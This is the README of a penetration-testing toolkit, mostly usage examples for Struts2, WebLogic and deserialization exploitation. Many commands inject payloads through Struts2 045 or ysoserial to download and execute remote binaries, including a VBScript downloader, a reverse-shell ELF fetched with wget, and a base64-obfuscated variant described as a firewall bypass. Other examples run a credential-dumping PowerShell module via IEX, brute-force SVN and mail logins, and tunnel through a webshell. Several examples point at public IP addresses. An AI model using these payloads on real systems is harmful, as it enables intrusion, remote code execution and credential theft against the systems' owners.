# fork note[Fork注意] 
If you do not contribute code, please do not fork, fork version will not automatically update the latest version, you will not enjoy the latest version brings you happiness and surprise

如果你不贡献代码，请不要fork，fork后的版本不会自动同步更新最新的版本，你不会享受到最新版本给你带来的快乐和惊喜

Rúguǒ nǐ bù gòngxiàn dàimǎ, qǐng bùyào fork,fork hòu de bǎnběn bù huì zìdòng tóngbù gēngxīn zuìxīn de bǎnběn, nǐ bù huì xiǎngshòu dào zuìxīn bǎnběn gěi nǐ dài lái de kuàilè he jīngxǐ

# penetration tools
## how install
```
brew install node
mkdir ~/safe && cd ~/safe
git clone https://github.com/hktalent/weblogic_java_des  mtx_jfxl
git clone https://github.com/hktalent/myhktools.git
cd myhktools
sh ./install.sh
myhktools
```
# update all node js lib
vi ~/npm-upgrade.sh 
```
#!/bin/sh
set -e
#set -x
for package in $(npm -g outdated --parseable --depth=0 | cut -d: -f2)
do
    npm -g install "$package"
done
```
运行
```
sh ~/npm-upgrade.sh 
```
# how use
node checkUrl.js -h
```
Usage: checkUrl [options]

  Options:

    -V, --version           output the version number
    -u, --url [value]       check url, no default
    -p, --proxy [value]     http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理
    -t, --t3 [value]        check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测
    -i, --install           install node modules,run: npm install
    -v, --verbose           show logs
    -w, --struts2 [value]   struts2 type,eg: 045
    -C, --cmd [value]       cmd type,eg: "ping -c 3 www.baidu.com"
    -o, --timeout           default 5000
    -l, --pool              default 300
    -r, --test              test
    -x, --proxy             http://127.0.0.1:8800
    -m, --menu [value]      scan url + menus, default ./urls/ta3menu.txt
    -s, --webshell [value]  scan webshell url，设置参数才会运行, default ./urls/webshell.txt
    -d, --method [value]    default PUT,DELETE,OPTIONS,HEAD,PATCH test
    -a, --host              host attack test,设置代理后该项功能可能无法使用,default true
    -k, --keys [value]      scan html keywords, default ./urls/keywords
    -h, --help              output usage information
	tomcat Put test
	Struts2_001
	Struts2_005
	Struts2_007
	Struts2_008
	Struts2_009
	Struts2_012
	Struts2_013
	Struts2_015
	Struts2_016
	Struts2_019
	Struts2_020
	Struts2_029
	Struts2_032
	Struts2_033
	Struts2_037
	Struts2_DevMode
	Struts2_045
	Struts2_046
	Struts2_048
	Struts2_053
	elasticsearch
	伪造host等检测

	node checkUrl.js -u http://192.168.10.216:8082/s2-032/ --struts2 045

	# 利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
	# cd myhktools/jars;python -m SimpleHTTPServer 8080
	node checkUrl.js -u http://92.68.0.5:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

	cd myhktools/jars;java -jar jfxl.jar xxx.x.xx.xx:xxx -i
	pwd
	put myhktools/bin/run.sh
	/home/weblogic/Oracle/Middleware/user_projects/domains/domain/run.sh

	node checkUrl.js -u http://19.6.4.19:8122/login.jsp --struts2 045 --cmd 'x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &'

	x=Lover1234_65.exe; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x};

	cmd.exe /c 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'


	java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.RMIRegistryExploit 192.168.24.10 7777 CommonsCollections1 cmd.exe /c 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

	java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3 C3P0WrapperConnPool
	gadget type specified, available are [UnicastRef, SpringPropertyPathFactory, C3P0WrapperConnPool]

	IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/Powershell-Modules/master/Get-MSSQLCredentialPasswords.psm1"); Get-MSSQLCredentialPasswords

	node checkUrl.js -u http://119.6.84.189:8122/login.jsp --struts2 045 --cmd 'echo "eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo="|base64 -D|sh'

	绕过防火墙、执行命令，避免引号等在注入攻击时失效
	思路：
	对执行的命令串编码，base64，运行时解码再执行，例如：
	echo 'eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo='|base64 -D|sh

	x=linuxRvsTcp123.elf; wget --header='User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' http://23.105.209.65/linuxRvsTcp123.elf; chmod +x linuxRvsTcp123.elf; ./${x} &

	# 生成远程反弹payload
	java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  C3P0 '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'

	java -jar ./ysoserial-master-v0.0.5-gb617b7b-16.jar  CommonsCollections1  '@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8888/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'


	node checkUrl.js -u http://192.168.10.15:8080/ --struts2 045 --cmd 'tasklist -svc'

	# 批量开放T3检测，txt中可以放url
	node checkUrl.js --t3 checkT3hostsUrlsFile.txt
	# 常见webshell和url扫描
	node checkUrl.js -s ./urls/webshell.txt -m ./urls/ta3menu.txt -u http://192.168.10.115:8080/

	# 当别人能够访问你，但是不能访问10.115的时候，进行端口转发，
	# 这样别人访问你的9000等同于访问10.115的8080，https的时候不使用，因为数字证书会检查域名
	node portForward.js 9000 192.168.10.115 8080

	# T3协议漏洞的检测和利用
	java -jar jfxl.jar 192.168.19.30:7001

	# 指定一个网段的漏洞验证扫描
	java -jar jfxl.jar 192.168.19.30-255:7001

	# 目录、文件中文本文件字符集批量转换为utf-8
	# 后渗透后得到很多win的数据txt文件，字符集gbk批量转换为utf8
	node gbk2utf8.js fileOrDirName

	# 多种解码
	node decode.js base64等格式字符串

	# eml 文件批量读取、转换
	node emlToFileToos.js /Volumes/MyWork/eml /Volumes/MyWork/eml_data

	# 手工XSS、渗透时需要的一些常用编码、解码
	open strDecodeEncode.html

	# 获取图片中的元数据（经纬度、创建时间）
	node getFileMetadata.js yourJpgFile.jpg

	# jndi内网无密码访问漏洞测试
	java -jar ./JNDI_TEST/JNDITEST.jar -p 7101 -u 192.168.10.216 -j QIMS_TEST -d mysql

	# weblogic中间件T3漏洞扫描
	编辑ip.txt
	python ./weblogic.py

	# 二维码解码
	node QrCodeDecode.js Haiios.jpg

	# svn 弱密码检测 2017-01-22 M.T.X
	node checkSvn.js http://18.12.88.10:8090/svn/ userName Pswd

	# 信箱默认密码测试
	node testPop3.js 12.171.20.20 110 mytels.txt

	# http代理，有时候需要一个二级代理，来获得、修改一些数据
	# 动态代理，每次自动随机使用代理
	node proxy/ProxyServer.js
	or
	pm2 start ProxyServer.js -i max

	# 更新代理 autoProxy.txt

	node checkProxy.js
	cat autoProxy.txt|sort|uniq >ok.txt
	mv ok.txt autoProxy.txt
	cat autoProxy.txt|wc -l

	# 提取目录、文件，包含二进制文件中 ip信息
	# 被入侵后，查看整个目录中所有ip信息，包含bin，可自行文件中的ip信息
	node getIps.js fileOrDir

	# 发送无跟踪邮件
	sendmail.js  内容自行修改
	邮件跟踪功能，当对方阅读后，能够从http://23.105.209.65/获取到阅读邮件的ip、user-agent等信息
	proxychains4 -f ~/pc.conf  node sendmail.js

	# 某种js压缩后的解码、压缩编码, win下运行
	压缩.hta

批量ip归属查询
node ./myapp/lib/myMysql.js -k myLogs.txt

	# 连接http隧道
	python reGeorgSocksProxy.py -l 127.0.0.1 -p 8080 -u http://11.22.10.10:8070/ip/x.jsp

node checkUrl.js -u 'http://19.16.14.19:8133/pxorg/login.jsp' --struts2 045 --cmd 'find . -name 417.jsp 2>/dev/null'

node checkUrl.js -u 'http://22.15.21.18:8082/sjcj/login.jsp' -v --struts2 weblogic

node checkAll.js -v --struts2 struts2

#!/usr/bin/env node
var kkk = require('./lib/core_new.js');
var r = new kkk();
// -v 参数才会输出
r.on('log',function(s)
{
	console.log(s);
});
r.on('info',function(s)
{
	console.log(s);
});
r.on('error',function(s)
{
	// console.log(s);
});
// 发现安全问题才会进入这里
r.on('vul',function(v,t,s)
{
	if(v.vul)console.log(v);
});

r.on('ready',function()
{
	console.log('准备好了....');
	// r.runChecks();
});
```

# other 一些常用的防火墙，禁ping、nmap
``` 
iptablesSh.sh
iptablesSh.sh
``` 
....
</code>
![exploit](https://github.com/hktalent/myhktools/blob/master/bin/wb1.jpg?raw=true)
</pre>
